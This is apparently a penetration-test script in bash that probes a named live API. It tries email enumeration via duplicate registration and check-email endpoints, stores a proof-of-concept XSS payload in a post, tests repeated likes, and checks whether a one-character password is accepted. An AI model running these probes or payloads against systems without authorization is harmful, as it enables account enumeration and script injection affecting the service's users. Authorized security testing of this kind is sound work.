#!/usr/bin/env bash
A="https://api.breezy.philippeluu.fr"; OUT=/tmp/riveta
TB=$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$OUT/regB.json")

echo "===== 1. email enumeration via duplicate registration ====="
echo -n "re-register EXISTING email (B) -> "
curl -sS -m 10 -w " [%{http_code}]\n" -X POST "$A/auth/register" -H "Content-Type: application/json" \
  -d '{"email":"riveta-pentest-b@example.com","password":"Whatever-1!","username":"dupCheckX"}' | head -c 250
echo -n "register NEW random email -> "
curl -sS -m 10 -w " [%{http_code}]\n" -X POST "$A/auth/register" -H "Content-Type: application/json" \
  -d '{"email":"riveta-pentest-nodup-9281@example.com","password":"Whatever-1!","username":"newEnum9281"}' | head -c 120

echo
echo "===== 2. check-email / verify endpoints (enumeration oracle) ====="
for ep in "/check-email" "/auth/check-email" "/users/check-email"; do
 for m in GET POST; do
  echo -n "$m $ep -> "; curl -sS -m 8 -w " [%{http_code}]\n" -X $m "$A$ep?email=riveta-pentest-b@example.com" -H "Content-Type: application/json" -d '{"email":"riveta-pentest-b@example.com"}' | head -c 120
 done
done

echo
echo "===== 3. stored-XSS: create post with HTML/script payload, read back raw ====="
XSS='<img src=x onerror=alert(document.domain)>"><script>alert(1)</script>'
RESP=$(curl -sS -m 10 -X POST "$A/posts" -H "Authorization: Bearer $TB" -H "Content-Type: application/json" \
  -d "{\"content\":\"riveta-pentest-xss $XSS\"}")
echo "$RESP" | head -c 400; echo
XID=$(echo "$RESP" | sed -n 's/.*"id":"\([0-9a-f]\{24\}\)".*/\1/p' | head -1)
echo "xss post id = $XID"
echo "-- read back via API (is payload stored verbatim?) --"
curl -sS -m 10 "$A/posts/$XID" | head -c 400; echo

echo
echo "===== 4. business logic: double-like same post inflates count? ====="
echo -n "like #1 -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" -X POST "$A/posts/$XID/like" -H "Authorization: Bearer $TB"
echo -n "like #2 (same user) -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" -X POST "$A/posts/$XID/like" -H "Authorization: Bearer $TB"
echo -n "like #3 (same user) -> "; curl -sS -m 8 -o /dev/null -w "%{http_code}\n" -X POST "$A/posts/$XID/like" -H "Authorization: Bearer $TB"
echo -n "likes_count now -> "; curl -sS -m 8 "$A/posts/$XID" | sed -n 's/.*"likes_count":\([0-9]*\).*/\1/p'

echo
echo "===== 5. password length policy (weak password accepted at register?) ====="
echo -n "register pw='1' -> "; curl -sS -m 10 -w " [%{http_code}]\n" -X POST "$A/auth/register" -H "Content-Type: application/json" -d '{"email":"riveta-pentest-weakpw-1@example.com","password":"1","username":"weakpw1"}' | head -c 200
